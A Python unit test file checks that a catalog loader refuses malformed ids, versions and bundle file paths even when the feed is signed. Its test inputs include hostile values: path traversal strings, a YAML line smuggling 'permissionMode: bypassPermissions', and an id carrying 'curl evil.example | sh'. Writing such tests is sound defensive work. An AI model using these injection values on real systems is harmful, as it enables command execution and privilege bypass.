"""Ids, versions and file names are checked on the person's machine before they become a path, an argument or YAML:
a signed feed is authentic, not validated."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from harnsy_hr import catalog, grammar
from harnsy_hr.errors import Refusal
from harnsy_hr.sources import DirSource
from tests.kit import HOST, Kit, sample


class GrammarTest(unittest.TestCase):
    def test_ids(self) -> None:
        for good in ["harnsy/accountant", "octo/sample-guest", "a/b", "0x/9-9"]:
            self.assertEqual(grammar.split_id(good), tuple(good.split("/")))
        for bad in ["noslash", "harnsy//etc/cron.d/x", "harnsy/../../../../tmp/x", "harnsy/x\npermissionMode: bypass",
                    "harnsy/x; curl evil.example | sh #", "harnsy/accountant\n", "Harnsy/accountant", "harnsy/-x",
                    "harnsy/a_b", "/accountant", "harnsy/", "harnsy/" + "a" * 65, "harnsy/бухгалтер", ""]:
            self.assertFalse(grammar.is_id(bad), bad)
            with self.assertRaises(Refusal) as got:
                grammar.split_id(bad)
            if len(bad) > 12:  # a short one may be part of the refusal's own example
                self.assertNotIn(bad, str(got.exception), "what was typed is not repeated")

    def test_versions(self) -> None:
        for good in ["1.0.0", "0.10.2", "12.0.1"]:
            self.assertTrue(grammar.is_version(good))
        for bad in ["1.0", "v1.0.0", "1.0.0\n", "01.0.0", "1.0.0-rc1", "1.0.0 ", "", "1.0.0/../x"]:
            self.assertFalse(grammar.is_version(bad), bad)

    def test_bundle_paths(self) -> None:
        for good in ["bundle.json", "docs/persona-casebook.md", "avatar.png", "avatar.jpeg", "skills/a/SKILL.md",
                     "skills/month-end-close/LICENSE", "skills/a/scripts/run.py", "skills/a/references/states.md",
                     "skills/a/assets/sheet_1.txt"]:
            self.assertTrue(grammar.is_bundle_path(good), good)
        for bad in ["SOUL.md", "config.yaml", ".env", "docs/other.md", "avatar.svg", "skills/a", "skills/a/hooks/run.sh",
                    "skills/a/scripts/.hidden", "skills/a/scripts/CON.txt", "skills/a/scripts/x.", "skills/a/scripts/SKILL.md",
                    "skills/a/references/b/c.md", "skills/A/SKILL.md", "skills/a/skill.md", "skills/../SKILL.md",
                    "skills/a/scripts/..", "skills/a/SKILL.md\n", "skills/" + "a" * 41 + "/SKILL.md", "manifest.json",
                    "skills/a/scripts/a b"]:
            self.assertFalse(grammar.is_bundle_path(bad), bad)

    def test_profile_names(self) -> None:
        for good in ["accountant", "my_accountant", "a", "9lives"]:
            self.assertEqual(grammar.profile_name_fault(good), "")
        for bad in ["hermes", "default", "test", "tmp", "root", "sudo", "Accountant", "-x", "a b", "", "a" * 65, "x\n"]:
            self.assertNotEqual(grammar.profile_name_fault(bad), "", bad)


class SignedButNotValidTest(unittest.TestCase):
    """A feed the catalog key signed is still refused when it names something outside the publisher's own rules."""

    def setUp(self) -> None:
        self.k = Kit()
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.dir = Path(tmp.name)

    def refused(self, want: str) -> None:
        with self.assertRaises(Refusal) as got:
            catalog.load_release(DirSource(self.dir), self.k.keys, HOST, self.k.now)
        self.assertIn(want, str(got.exception))

    def test_an_id_or_version_outside_the_grammar(self) -> None:
        pack = self.k.pack("harnsy/reviewer", "1.0.0", sample("reviewer"))
        for field, value in [("id", "noslash"), ("id", "harnsy//etc/cron.d/x"), ("id", "harnsy/../../../../tmp/x"),
                             ("id", "harnsy/x\npermissionMode: bypassPermissions"),
                             ("id", "harnsy/x; curl evil.example | sh #"), ("version", "1.0"), ("version", "1.0.0\n")]:
            self.k.release(self.dir, [pack], lambda f: f["bundles"][0].update({field: value}))
            self.refused("not in the catalog's form")

    def test_every_name_of_the_grammar_is_taken(self) -> None:
        part = "0" + "a-" * 31 + "z"  # 64 characters
        extra = ["avatar.png", "avatar.jpg", "avatar.jpeg", "avatar.webp", "skills/" + "s" * 40 + "/SKILL.md", "skills/-/LICENSE",
                 "skills/race-hunt/LICENSE", "skills/race-hunt/scripts/Run_it-2.sh", "skills/race-hunt/references/guide.v2.md",
                 "skills/race-hunt/assets/" + "f" * 64, "skills/race-hunt/scripts/console.txt"]
        pack = self.k.pack(part + "/" + part, "0.10.123", sample("reviewer") | dict.fromkeys(extra, b"x\n"))
        pack.entry["url"] = "https://hr.harnsy.dev/packs/one.harnsy"
        self.k.release(self.dir, [pack])
        _, employees = catalog.load_release(DirSource(self.dir), self.k.keys, HOST, self.k.now)
        self.assertEqual((employees[0].entry.id, len(employees[0].files)), (part + "/" + part, 14))

    def test_more_ids_and_versions_outside_the_grammar(self) -> None:
        pack, long = self.k.pack("harnsy/reviewer", "1.0.0", sample("reviewer")), "a" * 65
        for id in ["harnsy/x/y", "Harnsy/x", "harnsy/X", "harnsy/-x", "/x", "harnsy/", "harnsy/x ", "harnsy/x.y", "harnsy/" + long,
                   long + "/x", "harnsy/x\\..\\y"]:
            self.k.release(self.dir, [pack], lambda f: f["bundles"][0].update(id=id))
            self.refused("not in the catalog's form")
        for version in ["01.0.0", "1.0.0-rc1", "v1.0.0", "1.0.0/../x", ""]:
            self.k.release(self.dir, [pack], lambda f: f["bundles"][0].update(version=version))
            self.refused("not in the catalog's form")

    def test_a_revoked_entry_is_left_out_before_its_file_is_looked_for(self) -> None:
        pack = self.k.pack("harnsy/reviewer", "1.0.0", sample("reviewer"))
        def edit(f):
            f["bundles"][0]["url"] = "https://evil.example/x.harnsy"
            f["revoked"] = ["harnsy/reviewer@1.0.0"]
        self.k.release(self.dir, [pack], edit)
        self.assertEqual(catalog.load_release(DirSource(self.dir), self.k.keys, HOST, self.k.now)[1], [])

    def test_a_file_a_bundle_may_not_hold(self) -> None:
        long = "a" * 65
        for path in ["SOUL.md", "config.yaml", "skills/race-hunt/hooks/run.sh", "docs/notes.md", "skills/race-hunt/scripts/.env",
                     "README.md", "docs/other.md", "docs/persona-casebook.md.bak", "avatar.gif", "avatar.png/x", "bundle.json.d/x",
                     "skills/SKILL.md", "skills/Race/SKILL.md", "skills/race_hunt/SKILL.md", "skills/" + long + "/SKILL.md",
                     "skills/race-hunt/README.md", "skills/race-hunt/Scripts/run.sh", "skills/race-hunt/scripts/a/b.sh",
                     "skills/race-hunt/scripts/.hidden", "skills/race-hunt/scripts/run.", "skills/race-hunt/scripts/run it.sh",
                     "skills/race-hunt/scripts/nul.txt", "skills/race-hunt/assets/COM1", "skills/race-hunt/references/skill.md",
                     "skills/race-hunt/scripts/" + long]:
            pack = self.k.pack("harnsy/reviewer", "1.0.0", sample("reviewer") | {path: b"x"})
            self.k.release(self.dir, [pack])
            self.refused("is not a file a bundle carries")


if __name__ == "__main__":
    unittest.main()
